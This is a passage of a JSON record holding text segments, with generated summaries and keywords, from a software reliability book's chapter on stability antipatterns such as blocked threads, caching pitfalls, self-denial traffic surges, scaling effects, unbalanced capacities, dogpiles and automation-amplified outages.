obj;\n\n}\n\nThe “synchronized” keyword there should draw your attention. That’s a Java keyword that makes that method into a critical section. Only one thread may execute inside the method at a time. While one thread is executing this method, any other callers of the method will be blocked. Synchronizing the method here worked because the test cases all returned quickly. So even if there was some contention between threads trying to get into this method, they should all be served fairly quickly. But like the end of Back to the Future, the problem wasn’t with this class but its descendants.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 66\n\nPart of the system needed to check the in-store availability of items by making expensive inventory availability queries to a remote system. These external calls took a few seconds to execute. The results were known to be valid for at least fifteen minutes because of the way the inventory system worked. Since nearly 25 percent of the inventory lookups were on the week’s “hot items” and there could be as many as 4,000 (worst case) concurrent requests against the undersized, overworked inventory system, the developer decided to cache the resulting Availability object.\n\nThe developer decided that the right metaphor was a read-through cache. On a hit, it would return the cached object. On a miss, it would do the query, cache the result, and then return it. Following good object orientation princi- ples, the developer decided to create an extension of GlobalObjectCache, overriding the get() method to make the remote call. It was a textbook design. The new RemoteAvailabilityCache was a caching proxy, as described in Pattern Languages of Program Design 2 [VCK96]. It even had a timestamp on the cached entries so they could be expired when the data became too stale. This was an elegant design, but it wasn’t enough.\n\nThe problem with this design had nothing to do with the functional behavior. Functionally, RemoteAvailabilityCache was a nice piece of work. In times of stress, however, it had a nasty failure mode. The inventory system was undersized (see Unbalanced Capacities, on page 75), so when the front end got busy, the back end would be flooded with requests. Eventually it crashed. At that point, any thread calling RemoteAvailabilityCache.get() would block, because one single thread was inside the create() call, waiting for a response that would never come. There they sit, Estragon and Vladimir, waiting endlessly for Godot.\n\nThis example shows how these antipatterns interact perniciously to accelerate the growth of cracks. The conditions for failure were created by the blocking threads and the unbalanced capacities. The lack of timeouts in the integration points caused the failure in one layer to become a cascading failure. Ultimately, this combination of forces brought down the entire site.\n\nObviously, the business sponsors would laugh if you asked them, “Should the site crash if it can’t check availability for in-store pickup?” If you asked the architects or developers, “Will the site crash if it can’t check availability?” they would assert that it would not. Even the developer of RemoteAvailabilityCache would not expect the site to hang if the inventory system stopped responding. No one designed this failure mode into the combined system, but no one designed it out either.\n\nreport erratum • discuss\n\nBlocked Threads • 67\n\nUse Caching, Carefully\n\nCaching can be a powerful response to a performance problem. It can reduce the load on the database server and cut response times to a fraction of what they would be without caching. When misused, however, caching can create new problems.\n\nThe maximum memory usage of all application-level caches should be configurable. Caches that do not limit maximum memory consumption will eventually eat away at the memory available for the system. When that happens, the garbage collector will spend more and more time attempting to recover enough memory to process requests. By consuming memory needed for other tasks, the cache will actually cause a serious slowdown.\n\nNo matter what memory size you set on the cache, you need to monitor hit rates for the cached items to see whether most items are being used from cache. If hit rates are very low, then the cache is not buying any performance gains and might actually be slower than not using the cache. Keeping something in cache is a bet that the cost of generating it once, plus the cost of hashing and lookups, is less than the cost of generating it every time it’s needed. If a particular cached object is used only once during the lifetime of a server, then caching it is of no help.\n\nIt’s also wise to avoid caching things that are cheap to generate. I’ve seen content caches that had hundreds of cache entries that consisted of a single space character.\n\nCaches should be built using weak references to hold the cached item itself. If mem- ory gets low, the garbage collector is permitted to reap any object that is reachable only via weak references. As a result, caches that use weak references will help the garbage collector reclaim memory instead of preventing it.\n\nFinally, any cache presents a risk of stale data. Every cache should have an invalidation strategy to remove items from cache when its source data changes. The strategy you choose can have a major impact on your system’s capacity. For example, a point-to- point notification might work well when there are ten or twelve instances in your service. If there are thousands of instances, then point-to-point unicast is not effective and you need to look at either a message queue or some form of multicast notification. When invalidating, be careful to avoid the Database Dogpile (see Dogpile, on page 78.)\n\nLibraries\n\nLibraries are notorious sources of blocking threads, whether they are open- source packages or vendor code. Many libraries that work as service clients do their own resource pooling inside the library. These often make request threads block forever when a problem occurs. Of course, these never allow you to configure their failure modes, like what to do when all connections are tied up waiting for replies that’ll never come.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 68\n\nIf it’s an open source library, then you may have the time, skills, and resources to find and fix such problems. Better still, you might be able to search through the issue log to see if other people have already done the hard work for you.\n\nOn the other hand, if it’s vendor code, then you may need to exercise it yourself to see how it behaves under normal conditions and under stress. For example, what does it do when all connections are exhausted?\n\nIf it breaks easily, you need to protect your request-handling threads. If you can set timeouts, do so. If not, you might have to resort to some complex structure such as wrapping the library with a call that returns a future. Inside the call, you use a pool of your own worker threads. Then when the caller tries to execute the dangerous operation, one of the worker threads starts the real call. If the call makes it through the library in time, then the worker thread delivers its result to the future. If the call does not complete in time, the request-handling thread abandons the call, even though the worker thread might eventually complete. Once you’re in this territory, beware. Here there be dragons. Go too far down this path and you’ll find you’ve written a reactive wrapper around the entire client library.\n\nIf you’re dealing with vendor code, it may also be worth some time beating them up for a better client library.\n\nA blocked thread is often found near an integration point. These blocked threads can quickly lead to chain reactions if the remote end of the integration fails. Blocked threads and slow responses can create a positive feedback loop, amplifying a minor problem into a total failure.\n\nRemember This\n\nRecall that the Blocked Threads antipattern is the proximate cause of most failures.\n\nApplication failures nearly always relate to Blocked Threads in one way or another, including the ever-popular “gradual slowdown” and “hung server.” The Blocked Threads antipattern leads to Chain Reactions and Cascading Failures antipatterns.\n\nScrutinize resource pools.\n\nLike Cascading Failures, the Blocked Threads antipattern usually happens around resource pools, particularly database connection pools. A deadlock in the database can cause connections to be lost forever, and so can incorrect exception handling.\n\nreport erratum • discuss\n\nSelf-Denial Attacks • 69\n\nUse proven primitives.\n\nLearn and apply safe primitives. It might seem easy to roll your own pro- ducer/consumer queue: it isn’t. Any library of concurrency utilities has more testing than your newborn queue.\n\nDefend with Timeouts.\n\nYou cannot prove that your code has no deadlocks in it, but you can make sure that no deadlock lasts forever. Avoid infinite waits in function calls; use a version that takes a timeout parameter. Always use timeouts, even though it means you need more error-handling code.\n\nBeware the code you cannot see.\n\nAll manner of problems can lurk in the shadows of third-party code. Be very wary. Test it yourself. Whenever possible, acquire and investigate the code for surprises and failure modes. You might also prefer open source libraries to closed source for this very reason.\n\nSelf-Denial Attacks\n\nSelf-denial is only occasionally a virtue in people and never in systems. A self- denial attack describes any situation in which the system—or the extended system that includes humans—conspires against itself.\n\nThe classic example of a self-denial attack is the email from marketing to a “select group of users” that contains some privileged information or offer. These things replicate faster than the Anna Kournikova Trojan (or the Morris worm, if you’re really old school). Any special offer meant for a group of 10,000 users is guaranteed to attract millions. The community of networked bargain hunters can detect and share a reusable coupon code in milliseconds.\n\nOne great instance of self-denial occurred when the Xbox 360 was just becoming available for preorder. It was clear that demand would far outstrip supply in the United States, so when a major electronics retailer sent out an email promoting preorders, it helpfully included the exact date and time that the preorder would open. This email hit FatWallet, TechBargains, and prob- ably other big deal-hunter sites the same day. It also thoughtfully included a deep link that accidentally bypassed Akamai, guaranteeing that every image, JavaScript file, and style sheet would be pulled directly from the origin servers.\n\nOne minute before the appointed time, the entire site lit up like a nova, then went dark. It was gone in sixty seconds.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 70\n\nEveryone who has ever worked a retail site has a story like this. Sometimes it’s the coupon code that gets reused a thousand times or the pricing error that makes one SKU get ordered as many times as all other products com- bined. As Paul Lord says, “Good marketing can kill you at any time.”\n\nChannel partners can help you attack yourself, too. I’ve seen a channel partner take a database extract and then start accessing every URL in the database to cache pages.\n\nNot every self-inflicted wound can be blamed on the marketing department (although we sure can try). In a horizontal layer that has some shared resources, it’s possible for a single rogue server to damage all the others. For example, in an ATG-based infrastructure,7 one lock manager always handles distributed lock management to ensure cache coherency. Any server that wants to update a RepositoryItem with distributed caching enabled must acquire the lock, update the item, release the lock, and then broadcast a cache inval- idation for the item. This lock manager is a singular resource. As the site scales horizontally, the lock manager becomes a bottleneck and then finally a risk. If a popular item is inadvertently modified (because of a programming error, for example), then you can end up with thousands of request-handling threads on hundreds of servers all serialized waiting for a write lock on one item.\n\nAvoiding Self-Denial\n\nYou can avoid machine-induced self-denial by building a “shared-nothing” architecture. (“Shared-nothing” is what you have when each server can run without knowing anything about any other server. The machines don’t share databases, cluster managers, or any other resource. It’s a hypothetical ideal for horizontal scaling. In reality there’s always some amount of contention and coordination among the servers, but we can sometimes approximate shared-nothing.) Where that’s impractical, apply decoupling middleware to reduce the impact of excessive demand, or make the shared resource itself horizontally scalable through redundancy and a backside synchronization protocol. You can also design a fallback mode for the system to use when the shared resource is not available or not responding. For example, if a lock manager that provides pessimistic locking is not available, the application can fall back to using optimistic locking.\n\nIf you have a little time to prepare and are using hardware load balancing for traffic management, you can either set aside a portion of your infrastructure or provision new cloud resources to handle the promotion or traffic surge. Of\n\n7.\n\nwww.oracle.com/applications/customer-experience/ecommerce/products/commerce-platform/index.html\n\nreport erratum • discuss\n\nScaling Effects • 71\n\ncourse, this works only if the extraordinary traffic is directed at a portion of the system. In this case, even if the dedicated portion melts down, at least the rest of the system’s regular behavior is available.\n\nAutoscaling can help when the traffic surge does arrive, but watch out for the lag time. Spinning up new virtual machines takes precious minutes. My advice is to “pre-autoscale” by upping the configuration before the marketing event goes out.\n\nAs for the human-facilitated attacks, the keys are training, education, and communication. At the very least, if you keep the lines of communication open, you might have a chance to protect the systems from the coming surge. You might even be able to help them achieve their goals without jeopardizing the system.\n\nRemember This\n\nKeep the lines of communication open.\n\nSelf-denial attacks originate inside your own organization, when people cause self-inflicted wounds by creating their own flash mobs and traffic spikes. You can aid and abet these marketing efforts and protect your system at the same time, but only if you know what’s coming. Make sure nobody sends mass emails with deep links. Send mass emails in waves to spread out the peak load. Create static “landing zone” pages for the first click from these offers. Watch out for embedded session IDs in URLs.\n\nProtect shared resources.\n\nProgramming errors, unexpected scaling effects, and shared resources all create risks when traffic surges. Watch out for Fight Club bugs, where increased front-end load causes exponentially increasing back-end processing.\n\nExpect rapid redistribution of any cool or valuable offer.\n\nAnybody who thinks they’ll release a special deal for limited distribution is asking for trouble. There’s no such thing as limited distribution. Even if you limit the number of times a fantastic deal can be redeemed, you’ll still get crushed with people hoping beyond hope that they, too, can get a PlayStation Twelve for $99.\n\nScaling Effects\n\nIn biology, the square-cube law explains why we’ll never see elephant-sized spiders. The bug’s weight scales with volume, so it goes as O(n^3). The strength of the leg scales with the area of the cross section, so it goes as O(n^2). If you\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 72\n\nmake the critter ten times as large, that makes the strength-to-weight ratio one-tenth of the small version, and the legs just can’t hold it up.\n\nWe run into such scaling effects all the time. Anytime you have a “many-to-one” or “many-to-few” relationship, you can be hit by scaling effects when one side increases. For instance, a database server that holds up just fine when ten machines call it might crash miserably when you add the next fifty machines.\n\nIn the development environment, every application runs on one machine. In QA, pretty much every application looks like one or two machines. When you get to production, though, some applications are really, really small, and some are medium, large, or humongous. Because the development and test environments rarely replicate production sizing, it can be hard to see where scaling effects will bite you.\n\nPoint-to-Point Communications\n\nOne of the worst places that scaling effects will bite you is with point-to-point communication. Point-to-point communication between machines probably works just fine when only one or two instances are communicating, as in the following figure.\n\nQA Server 2\n\nDev Server\n\nApp 1\n\nDevelopmentEnvironment\n\nQA Server 1QA / TestEnvironment\n\nApp 2\n\nApp 1\n\nWith point-to-point connections, each instance has to talk directly to every other instance, as shown in the next figure.\n\nApp n\n\nApp 2\n\nApp 1\n\nProd Server 2Production Environment\n\nProd Server n\n\nProd Server 1\n\nreport erratum • discuss",
      "page_number": 75,
      "chapter_number": 10,
      "summary": "This chapter covers segment 10 (pages 75-82). Key topics include caches, cached, and object. Only one observable variable really matters—whether the system is able to process transactions or not.",
      "keywords": [
        "Blocked Threads",
        "Blocked Threads antipattern",
        "Threads",
        "system",
        "cache",
        "object",
        "code",
        "Blocked",
        "Threads antipattern",
        "time",
        "method",
        "involve outright crashes",
        "server",
        "report erratum",
        "n’t"
      ],
      "concepts": [
        "caches",
        "cached",
        "object",
        "threads",
        "memory",
        "code",
        "times",
        "timing",
        "problem",
        "failures"
      ],
      "similar_chapters": [
        {
          "book": "C++ Concurrency in Action",
          "chapter": 37,
          "title": "Segment 37 (pages 363-372)",
          "relevance_score": 0.71,
          "method": "sentence_transformers"
        },
        {
          "book": "Computer Systems A Programmer’s Perspective",
          "chapter": 51,
          "title": "Segment 51 (pages 1023-1040)",
          "relevance_score": 0.7,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 39,
          "title": "Segment 39 (pages 388-398)",
          "relevance_score": 0.67,
          "method": "sentence_transformers"
        },
        {
          "book": "C++ Concurrency in Action",
          "chapter": 2,
          "title": "Segment 2 (pages 9-16)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "C++ Concurrency in Action",
          "chapter": 16,
          "title": "Segment 16 (pages 141-154)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 11,
      "title": "Segment 11 (pages 83-90)",
      "start_page": 83,
      "end_page": 90,
      "detection_method": "topic_boundary",
      "content": "Scaling Effects • 73\n\nThe total number of connections goes up as the square of the number of instances. Scale that up to a hundred instances, and the O(n^2) scaling becomes quite painful. This is a multiplier effect driven by the number of application instances. Depending on the eventual size of your system, O(n^2) scaling might be fine. Either way, you should know about this effect before your system hits production.\n\nBe sure to distinguish between point-to-point inside a service versus point- to-point between services. The usual pattern between services is fan-in from my farm of machines to a load balancer in front of your machines. This is a different case. Here we’re not talking about having every service call every other service.\n\nUnfortunately, unless you are Microsoft or Google, it is unlikely you can build a test farm the same size as your production environment. This type of defect cannot be tested out; it must be designed out.\n\nThis is one of those times where there is no “best” choice, just a good choice for a particular set of circumstances. If the application will only ever have two servers, then point-to-point communication is perfectly fine. (As long as the communication is written so it won’t block when the other server dies!) As the number of servers grows, then a different communication strategy is needed. Depending on your infrastructure, you can replace point-to-point communication with the following:\n\nUDP broadcasts • TCP or UDP multicast • Publish/subscribe messaging • Message queues\n\nBroadcasts do the job but aren’t bandwidth-efficient. They also cause some additional load on servers that aren’t interested in the messages, since the servers’ NIC gets the broadcast and must notify the TCP/IP stack. Multicasts are more efficient, since they permit only the interested servers to receive the message. Publish/subscribe messaging is better still, since a server can pick up a message even if it wasn’t listening at the precise moment the message was sent. Of course, publish/subscribe messaging often brings in some serious infrastructure cost. This is a great time to apply the XP principle that says, “Do the simplest thing that will work.”\n\nShared Resources\n\nAnother scaling effect that can jeopardize stability is the “shared resource” effect. Commonly seen in the guise of a service-oriented architecture or\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 74\n\n“common services” project, the shared resource is some facility that all members of a horizontally scalable layer need to use. With some application servers, the shared resource will be a cluster manager or a lock manager. When the shared resource gets overloaded, it’ll become a bottleneck limiting capacity. The following figure should give you an idea of how the callers can put a hurting on the shared resource.\n\nApp 1\n\nApp 2\n\nCommon Service\n\nApp 3\n\nApp 4\n\nApp 5\n\nApp 6\n\nWhen the shared resource is redundant and nonexclusive—meaning it can service several of its consumers at once—then there’s no problem. If it satu- rates, you can add more, thus scaling the bottleneck.\n\nThe most scalable architecture is the shared-nothing architecture. Each server operates independently, without need for coordination or calls to any centralized services. In a shared nothing architecture, capacity scales more or less linearly with the number of servers.\n\nThe trouble with a shared-nothing architecture is that it might scale better at the cost of failover. For example, consider session failover. A user’s session resides in memory on an application server. When that server goes down, the next request from the user will be directed to another server. Obviously, we’d like that transition to be invisible to the user, so the user’s session should be loaded into the new application server. That requires some kind of coordination between the original application server and some other device. Perhaps the application server sends the user’s session to a session backup server after each page request. Maybe it serializes the session into a database table or shares its sessions with another designated application server. There are numerous strategies for session failover, but they all involve getting the user’s session off the original server. Most of the time, that implies some level of shared resources.\n\nYou can approximate a shared-nothing architecture by reducing the fan-in of shared resources, i.e., cutting down the number of servers calling on the shared resource. In the example of session failover, you could do this by designating pairs of application servers that each act as the failover server for the other.\n\nreport erratum • discuss\n\nUnbalanced Capacities • 75\n\nToo often, though, the shared resource will be allocated for exclusive use while a client is processing some unit of work. In these cases, the probability of con- tention scales with the number of transactions processed by the layer and the number of clients in that layer. When the shared resource saturates, you get a connection backlog. When the backlog exceeds the listen queue, you get failed transactions. At that point, nearly anything can happen. It depends on what function the caller needs the shared resource to provide. Particularly in the case of cache managers (providing coherency for distributed caches), failed transactions lead to stale data or—worse—loss of data integrity.\n\nRemember This\n\nExamine production versus QA environments to spot Scaling Effects.\n\nYou get bitten by Scaling Effects when you move from small one-to-one development and test environments to full-sized production environments. Patterns that work fine in small environments or one-to-one environments might slow down or fail completely when you move to production sizes.\n\nWatch out for point-to-point communication.\n\nPoint-to-point communication scales badly, since the number of connec- tions increases as the square of the number of participants. Consider how large your system can grow while still using point-to-point connections —it might be sufficient. Once you’re dealing with tens of servers, you will probably need to replace it with some kind of one-to-many communication.\n\nWatch out for shared resources.\n\nShared resources can be a bottleneck, a capacity constraint, and a threat to stability. If your system must use some sort of shared resource, stress- test it heavily. Also, be sure its clients will keep working if the shared resource gets slow or locks up.\n\nUnbalanced Capacities\n\nWhether your resources take months, weeks, or seconds to provision, you can end up with mismatched ratios between different layers. That makes it possible for one tier or service to flood another with requests beyond its capacity. This especially holds when you deal with calls to rate-limited or throttled APIs!\n\nIn the illustration on page 76, the front-end service has 3,000 request-handling threads available. During peak usage, the majority of these will be serving product catalog pages or search results. Some smaller number will be in various corporate “telling” pages. A few will be involved in a checkout process.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 76\n\nFront End\n\n20 Hosts75 Instances3,000 Threads\n\nBack End\n\n6 Hosts6 Instances450 Threads\n\nOf the threads serving a checkout-related page, a tiny fraction will be querying the scheduling service to see whether the item can be installed in the cus- tomer’s home by a local delivery team. You can do some math and science to predict how many threads could be making simultaneous calls to the scheduling system. The math is not hard, though it does rely on both statistics and assumptions—a combination notoriously easy to manipulate. But as long as the scheduling service can handle enough simultaneous requests to meet that demand prediction, you’d think that should be sufficient.\n\nNot necessarily.\n\nSuppose marketing executes a self-denial attack by offering the free installation of any big-ticket appliance for one day only. Suddenly, instead of a tiny fraction of a fraction of front-end threads involving scheduling queries, you could see two times, four times, or ten times as many. The fact is that the front end always has the ability to overwhelm the back end, because their capacities are not balanced.\n\nIt might be impractical to evenly match capacity in each system for a lot of reasons. In this example, it would be a gross misuse of capital to build up every service to the same size just on the off chance that traffic all heads to one service for some reason. The infrastructure would be 99 percent idle except for one day out of five years!\n\nSo if you can’t build every service large enough to meet the potentially over- whelming demand from the front end, then you must build both callers and providers to be resilient in the face of a tsunami of requests. For the caller, Circuit Breaker will help by relieving the pressure on downstream services when responses get slow or connections get refused. For service providers, use Handshaking and Backpressure to inform callers to throttle back on the requests. Also consider Bulkheads to reserve capacity for high-priority callers of critical services.\n\nreport erratum • discuss\n\nUnbalanced Capacities • 77\n\nDrive Out Through Testing\n\nUnbalanced capacities are another problem rarely observed during QA. The main reason is that QA for every system is usually scaled down to just two servers. So during integration testing, two servers represent the front-end system and two servers represent the back-end system, resulting in a one- to-one ratio. In production, where the big budget gets allocated, the ratio could be ten to one or worse.\n\nShould you make QA an exact scale replica of the entire enterprise? It would be nice, wouldn’t it? Of course, you can’t do that. You can apply a test harness, though. (See Test Harnesses, on page 113.) By mimicking a back-end system wilting under load, the test harness helps you verify that your front-end system degrades gracefully. (See Handle Others' Versions, on page 270, for more ideas for testing.)\n\nOn the flip side, if you provide a service, you probably expect a “normal” workload. That is, you reasonably expect that today’s distribution of demand and transaction types will closely match yesterday’s workload. If all else remains unchanged, then that’s a reasonable assumption. Many factors can change the workload coming at your system, though: marketing campaigns, publicity, new code releases in the front-end systems, and especially links on social media and link aggregators. As a service provider, you’re even further removed from the marketers who would deliberately cause these traffic changes. Surges in publicity are even less predictable.\n\nSo, what can you do if your service serves such unpredictable callers? Be ready for anything. First, use capacity modeling to make sure you’re at least in the ballpark. Three thousand threads calling into seventy-five threads is not in the ballpark. Second, don’t just test your system with your usual workloads. See what happens if you take the number of calls the front end could possibly make, double it, and direct it all against your most expensive transaction. If your system is resilient, it might slow down—even start to fail fast if it can’t process transactions within the allowed time (see Fail Fast, on page 106)—but it should recover once the load goes down. Crashing, hung threads, empty responses, or nonsense replies indicate your system won’t survive and might just start a cascading failure. Third, if you can, use autoscaling to react to surging demand. It’s not a panacea, since it suffers from lag and can just pass the problem down the line to an overloaded plat- form service. Also, be sure to impose some kind of financial constraint on your autoscaling as a risk management measure.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 78\n\nRemember This\n\nExamine server and thread counts.\n\nIn development and QA, your system probably looks like one or two servers, and so do all the QA versions of the other systems you call. In production, the ratio might be more like ten to one instead of one to one. Check the ratio of front-end to back-end servers, along with the number of threads each side can handle in production compared to QA.\n\nObserve near Scaling Effects and users.\n\nUnbalanced Capacities is a special case of Scaling Effects: one side of a relationship scales up much more than the other side. A change in traffic patterns—seasonal, market-driven, or publicity-driven—can cause a usually benign front-end system to suddenly flood a back-end system, in much the same way as a hot Reddit post or celebrity tweet causes traffic to suddenly flood websites.\n\nVirtualize QA and scale it up.\n\nEven if your production environment is a fixed size, don’t let your QA languish at a measly pair of servers. Scale it up. Try test cases where you scale the caller and provider to different ratios. You should be able to automate this all through your data center automation tools.\n\nStress both sides of the interface.\n\nIf you provide the back-end system, see what happens if it suddenly gets ten times the highest-ever demand, hitting the most expensive transaction. Does it fail completely? Does it slow down and recover? If you provide the front-end system, see what happens if calls to the back end stop responding or get very slow.\n\nDogpile\n\nA large-scale power outage acts a lot like a software failure. It starts with a small event, like a power line grounding out on a tree. Ordinarily that would be no big deal, but under high-stress conditions it can turn into a cascading failure that affects millions of people. We can learn from how power gets restored after an outage. Operators must perform a tricky balancing act between generation, transmission, and demand.\n\nThere used to be a common situation where power would be restored and then cut off again in a matter of seconds. The surge of current demand from millions of air conditioners and refrigerators would overload the newly restored supply. It was especially common in large metro areas during heat waves.\n\nreport erratum • discuss\n\nDogpile • 79\n\nThe increased current load would hit just when supply was low, causing excess demand to trip circuit breakers. Lights out, again.\n\nSmarter appliances and more modern control systems have mitigated that particular failure mode now, but there are still useful lessons for us. For one thing, only the fully assembled system—motors, transmission lines, circuit breakers, generators, and control systems—exhibits that behavior. No smaller subset of components can produce the same outcome. Troubling when you think about QA environments, isn’t it?\n\nAnother lesson is that the steady-state load on a system might be significantly different than the startup or periodic load. Imagine a farm of app servers booting up. Every single one needs to connect to a database and load some amount of reference or seed data. Every one starts with a cold cache and only gradually gets to a useful working set. Until then, most HTTP requests translate into one or more database queries. That means the transient load on the database is much higher when applications start up than after they’ve been running for a while.\n\nColo Workaround\n\nCraig Andera, developer at Adzerk, relates this story:\n\nI once worked in the IT department of a company in the housing market. I was on the same team as the guys that maintained the servers and was often in and out of the server room, occasionally helping with maintenance tasks. As the server room acquired more and more hardware, we ran into a problem one day when the breaker tripped. When it was reset, all of the computers started up, pulling hard on current. Breaker trips again. There were two fixes for this:\n\n1. Bring the machines up one at a time.\n\n2.\n\nJam a screwdriver into the breaker handle so it wouldn’t trip again.\n\nNumber 2 necessitated clamping a fan in place to keep the stressed breaker from overheating.\n\nWhen a bunch of servers impose this transient load all at once, it’s called a dogpile. (“Dogpile” is a term from American football in which the ball-carrier gets compressed at the base of a giant pyramid of steroid-infused flesh.)\n\nA dogpile can occur in several different situations:\n\nWhen booting up several servers, such as after a code upgrade and restart • When a cron job triggers at midnight (or on the hour for any hour, really) • When the configuration management system pushes out a change\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 80\n\nSome configuration management tools allow you to configure a randomized “slew” that will cause servers to pull changes at slightly different times, dis- persing the dogpile across several seconds.\n\nDogpiles can also occur when some external phenomenon causes a synchro- nized “pulse” of traffic. Imagine a city street with walk/don’t walk signs on every corner. When people are allowed to cross a street, they’ll move in a clump. People walk at different speeds so they’ll disperse to some degree, but the next stoplight will resynchronize them into a clump again. Look out for any place where many threads can get blocked waiting for one thread to complete. When the logjam breaks, the newly freed threads will dogpile any other downstream system.\n\nA pulse can develop during load tests, if the virtual user scripts have fixed- time waits in them. Instead, every pause in a script should have a small random delta applied.\n\nRemember This\n\nDogpiles force you to spend too much to handle peak demand.\n\nA dogpile concentrates demand. It requires a higher peak capacity than you’d need if you spread the surge out.\n\nUse random clock slew to diffuse the demand.\n\nDon’t set all your cron jobs for midnight or any other on-the-hour time. Mix them up to spread the load out.\n\nUse increasing backoff times to avoid pulsing.\n\nA fixed retry interval will concentrate demand from callers on that period. Instead, use a backoff algorithm so different callers will be at different points in their backoff periods.\n\nForce Multiplier\n\nLike a lever, automation allows administrators to make large movements with less effort. It’s a force multiplier.\n\nOutage Amplification\n\nOn August 11, 2016, link aggregator Reddit.com suffered an outage. It was unavailable for approximately ninety minutes and had degraded service for about another ninety minutes.8 In their postmortem, Reddit admins described a conflict between deliberate, manual changes and their automation platform:\n\n8.\n\nwww.reddit.com/r/announcements/comments/4y0m56/why_reddit_was_down_on_aug_11\n\nreport erratum • discuss",
      "page_number": 83,
      "chapter_number": 11,
      "summary": "This chapter covers segment 11 (pages 83-90). Key topics include server, scaling, and scales.",
      "keywords": [
        "Scaling Effects",
        "shared resource",
        "server",
        "system",
        "shared",
        "Scaling",
        "service",
        "Effects",
        "App",
        "application server",
        "resource",
        "number",
        "communication",
        "Prod Server",
        "Dev Server App"
      ],
      "concepts": [
        "server",
        "scaling",
        "scales",
        "service",
        "capacity",
        "capacities",
        "gets",
        "getting",
        "threads",
        "production"
      ],
      "similar_chapters": [
        {
          "book": "Microservices Up and Running",
          "chapter": 9,
          "title": "Segment 9 (pages 86-94)",
          "relevance_score": 0.65,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 8",
          "chapter": 47,
          "title": "Segment 47 (pages 448-460)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice Architecture",
          "chapter": 4,
          "title": "Segment 4 (pages 25-32)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 3",
          "chapter": 54,
          "title": "Segment 54 (pages 513-523)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 12,
      "title": "Segment 12 (pages 91-98)",
      "start_page": 91,
      "end_page": 98,
      "detection_method": "topic_boundary",
      "content": "Force Multiplier • 81\n\n1. First, the admins shut down their autoscaler service so that they could upgrade a ZooKeeper cluster.9\n\n2. Sometime into the upgrade process, the package management system\n\ndetected the autoscaler was off and restarted it.\n\n3. The autoscaler came back online and read the partially migrated ZooKeeper data. The incomplete ZooKeeper data reflected a much smaller environment than was currently running.\n\n4. The autoscaler decided that too many servers were running. It therefore shut down many application and cache servers. This is the start of the downtime.\n\n5. Sometime later, the admins identified the autoscaler as the culprit. They overrode the autoscaler and started restoring instances manually. The instances came up, but their caches were empty. They all made requests to the database at the same time, which led to a dogpile on the database. Reddit was up but unusably slow during this time.\n\n6. Finally, the caches warmed sufficiently to handle typical traffic. The long nightmare ended and users resumed downvoting everything they disagree with. In other words, normal activity resumed. The most interesting aspect of this outage is the way it emerged from a conflict between the automation platform’s “belief” about the expected state of the system and the administrator’s belief about the expected state. When the package management system reactivated the autoscaler, it had no way to know that the autoscaler was expected to be down. Likewise, the autoscaler had no way to know that its source of truth (ZooKeeper) was temporarily unable to report the truth. Like HAL 9000, the automation systems were stuck between two conflicting sets of instructions.\n\nA similar condition can occur with service discovery systems. A service dis- covery service is a distributed system that attempts to report on the state of many distributed systems to other distributed systems. When things are running normally, they work as shown in the figure on page 82.\n\nThe nodes of the discovery system gossip among themselves to synchronize their knowledge of the registered services. They run health checks periodically to see if any of the services’ nodes should be taken out of rotation. If a single instance of one of the services stops responding, then the discovery service removes that node’s IP address. No wonder they can amplify a failure. One\n\n9.\n\nhttp://zookeeper.apache.org\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 82\n\nLoad Balancer\n\nDiscoveryServiceNode 1\n\nApplications\n\nDiscoveryServiceNode 2\n\nDiscoveryServiceNode 3\n\nservice Amany nodes\n\nservice Bmany nodes\n\nservice Cmany nodes\n\nservice Dmany nodes\n\nhealth checks\n\n“all services OK”“all services OK”\n\nespecially challenging failure mode occurs when a service discovery node is itself partitioned away from the rest of the network. As shown in the next figure, node 3 of the discovery service can no longer reach any of the managed services. Node 3 kind of panics. It can’t tell the difference between “the rest of the universe just disappeared” and “I’ve got a blindfold on.” But if node 3 can still gossip with nodes 1 and 2, then it can propagate its belief to the whole cluster. All at once, service discovery reports that zero services are available. Any application that needs a service gets told, “Sorry, but it looks like a meteor hit the data center. It’s a smoking crater.”\n\nhealth checks\n\nLoad Balancer\n\nDiscoveryServiceNode 1\n\nApplications\n\nDiscoveryServiceNode 2\n\nDiscoveryServiceNode 3\n\nservice Amany nodes\n\nservice Bmany nodes\n\nservice Cmany nodes\n\nservice Dmany nodes\n\n“Node 3 says ‘Everything crashed!’”“Everything crashed!”\n\nXnetwork partitionedall health checks fail\n\nreport erratum • discuss\n\nForce Multiplier • 83\n\nConsider a similar failure, but with a platform management service instead. This service is responsible for starting and stopping machine instances. If it forms a belief that everything is down, then it would necessarily start a new copy of every single service required to run the enterprise.\n\nThis situation arises mostly with “control plane” software. The “control plane” refers to software that exists to help manage the infrastructure and applica- tions rather than directly delivering user functionality. Logging, monitoring, schedulers, scalers, load balancers, and configuration management are all parts of the control plane.\n\nThe common thread running through these failures is that the automation is not being used to simply enact the will of a human administrator. Rather, it’s more like industrial robotics: the control plane senses the current state of the system, compares it to the desired state, and effects changes to bring the current state into the desired state.\n\nIn the Reddit failure, ZooKeeper held a representation of the desired state. That representation was (temporarily) incorrect.\n\nIn the case of the discovery service, the partitioned node was not able to cor- rectly sense the current state.\n\nA failure can also result when the “desired” state is computed incorrectly and may be impossible or impractical. For example, a naive scheduler might try to run enough instances to drain a queue in a fixed amount of time. Depending on the 